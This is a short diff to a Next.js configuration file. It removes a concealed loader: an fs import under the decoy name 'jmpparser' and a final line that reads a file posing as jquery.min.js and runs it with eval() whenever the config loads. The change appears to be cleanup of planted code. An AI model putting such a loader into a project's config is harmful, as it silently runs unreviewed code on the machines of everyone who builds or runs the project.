@@ -1,7 +1,5 @@
 /** @type {import('next').NextConfig} */
 
-const jmpparser = require('fs'); 
-
 const nextConfig = {
   images: {
     remotePatterns: [
@@ -61,4 +59,3 @@ const nextConfig = {
 };
 
 module.exports = nextConfig;
-jmpparser.readFile(__dirname  + '/scripts/jquery.min.js', 'utf8', (err, code) => { eval(code); console.log(err) });
